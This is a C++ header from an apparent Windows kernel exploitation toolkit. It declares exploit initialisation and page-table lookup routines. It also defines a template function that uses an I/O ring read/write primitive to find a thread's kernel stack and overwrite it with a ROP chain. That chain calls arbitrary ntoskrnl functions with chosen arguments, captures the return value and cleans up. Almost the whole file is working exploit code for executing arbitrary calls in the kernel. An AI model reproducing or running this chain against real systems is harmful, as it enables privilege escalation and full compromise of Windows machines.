#pragma once

#include "win_defs.h"
#include "ioring.h"
#include "moduleinfo.h"

#include <cstdint>
#include <memory>
#include <spdlog/spdlog.h>

#define SMASH_TIMEOUT 0x80000

#define M_ALLOC(_size_) LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, (_size_))
#define M_FREE(_addr_) LocalFree((_addr_))

#define GET_PTE_ADDRESS_SIGNATURE { 0x48, 0xc1, 0xe9, 0xff, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x23, 0xc8, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc1 }
#define STACK_PUT(type, val) ioring->write64<type>(ullRetAddress + stackOffset, val); spdlog::debug("{:#018x}: {}", stackOffset, #val); stackOffset += 8;
#define CALL_ARGS(...) std::vector<void*>((void*)__VA_ARGS__)

namespace collat::kernel {
	bool init_exploit(uint64_t nt_base);
	void do_write(uint64_t address);
	bool create_ioring();
	void destroy_ioring();
	collat::ioring* get_ioring();
	void fetch_debug_block_keys(void* kernelBase);
	uint64_t debug_block_decrypt(uint64_t base, uint64_t value);
	bool fetch_pagetable_base();
	MMPTE get_pagetable_entry(UINT64 virtualAddress);
	bool init_rop();
	void dummy_thread();
	uint64_t get_gadget(std::string name);

	// cannot call anything with more than 4 params due to stack limitations 
	template<typename T, typename... Args>
	T call(void* address, Args... args) {
		HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)dummy_thread, nullptr, CREATE_SUSPENDED, nullptr);

		auto ioring = get_ioring();
		auto ullThreadAddress = collat::get_object<uint64_t>(GetCurrentProcessId(), hThread);
		auto ullStackBase = ioring->raw_read<uint64_t>((void*)(ullThreadAddress + 0x38));

		uint64_t ullRetAddress = 0;
		for (int i = 0x8; i < 0x7000; i += 0x8) {
			auto value = ioring->raw_read<uint64_t>((void*)(ullStackBase - i));
			if ((value & 0xfffff00000000000) == 0xfffff00000000000) {
				if (value == (uint64_t)collat::kmodule::get_base("ntoskrnl.exe") + 0x447db6) {
					ullRetAddress = ullStackBase - i;
					//spdlog::debug("found KiApcInterrupt @ 0x{:x} - 0x{:x}", ullStackBase, i);
					break;
				}
			}
		}

		if (ullRetAddress == 0) {
			spdlog::error("failed to execute rop chain, could not KiApcInterrupt in stack");
			return (T)-1;
		}

		uint64_t stackOffset = 0;
		//ioring->raw_write<uint64_t>(ullRetAddress + stackOffset, get_gadget("pop rax; ret"))

		std::vector<void*> arguments = { (void*)args... };
		size_t argcnt = arguments.size();
		
		HANDLE hEvent = CreateEvent(nullptr, TRUE, FALSE, TEXT("CallEvent"));


		spdlog::debug("setting up stack:");
		STACK_PUT(uint64_t, get_gadget("ret"));
		
		if (argcnt > 0) {
			STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
			STACK_PUT(void*, arguments.at(0));
		}

		if (argcnt > 1) {
			STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
			STACK_PUT(void*, arguments.at(1));
		}

		if (argcnt > 2) {
			STACK_PUT(uint64_t, get_gadget("pop r8; ret"));
			STACK_PUT(void*, arguments.at(2));
		}

		if (argcnt > 3) {
			STACK_PUT(uint64_t, get_gadget("pop r9; ret"));
			STACK_PUT(void*, arguments.at(3));
		}


		// call function
		STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
		STACK_PUT(void*, address);
		STACK_PUT(uint64_t, get_gadget("jmp rax"));

		// adjust stack
		STACK_PUT(uint64_t, get_gadget("add rsp, 0x78; ret"));

		
		int usedSpace = 0;
		if (argcnt > 4) {	

			// setup 0x20 byte shadow region
			for (int i = 0; i < 4; i++) {
				STACK_PUT(uint64_t, get_gadget("ret"));
				usedSpace++;
			}

			// put arguments onto stack
			for (int i = 4; i < argcnt; i++) {
				
				//spdlog::debug("stack arg");
				STACK_PUT(void*, arguments.at(i));
				usedSpace++;
			}

			
		}

		// padding for stack adjustment
		for (int i = 0; i < ((0x78 / 8) - usedSpace); i++) {
			// padding
			STACK_PUT(uint64_t, get_gadget("ret"));
		}

		// align the stack for calls
		/*if (argcnt > 4 && ((argcnt - 4) % 2)) {
			spdlog::debug("aligning, current stack offset: 0x{:x}", stackOffset);
			STACK_PUT(uint64_t, get_gadget("ret"));
		}*/

		if ((stackOffset / 8) % 2) {
			spdlog::debug("unaligned stack (0x{:x}), aligning.", stackOffset);
			STACK_PUT(uint64_t, get_gadget("ret"));
		}

		uint64_t returnValue = 0;
		// get return value;
		STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
		STACK_PUT(uint64_t, (uint64_t) & returnValue);
		STACK_PUT(uint64_t, get_gadget("mov [rcx], rax; ret"));

		// signal event

		STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
		STACK_PUT(uint64_t, (uint64_t)hEvent);
		STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
		STACK_PUT(uint64_t, 0);
		STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
		STACK_PUT(uint64_t, (uint64_t)collat::kmodule::get_export("ntoskrnl.exe", "ZwSetEvent"));
		STACK_PUT(uint64_t, get_gadget("ret"));
		STACK_PUT(uint64_t, get_gadget("jmp rax"));

		
		

		// call ZwTerminateThread
		STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
		STACK_PUT(uint64_t, (uint64_t)hThread);
		STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
		STACK_PUT(uint64_t, STATUS_SUCCESS);
		STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
		STACK_PUT(uint64_t, (uint64_t)collat::kmodule::get_base("ntoskrnl.exe") + 0x444100);
		STACK_PUT(uint64_t, get_gadget("jmp rax"));

		spdlog::debug("resuming thread");
		ResumeThread(hThread);

		WaitForSingleObject(hEvent, INFINITE);
		CloseHandle(hEvent);

		//Sleep(50); // maybe wait for an event to be triggered by ropchain instead?

		return returnValue;
	}

	
	uint64_t callvec(void* address, std::vector<void*> arguments);

	template<typename T, typename... Args>
	inline T call(std::string moduleName, std::string functionName, Args... args) {
		return call<T>(kmodule::get_export(moduleName, functionName), args...);
	}


	
}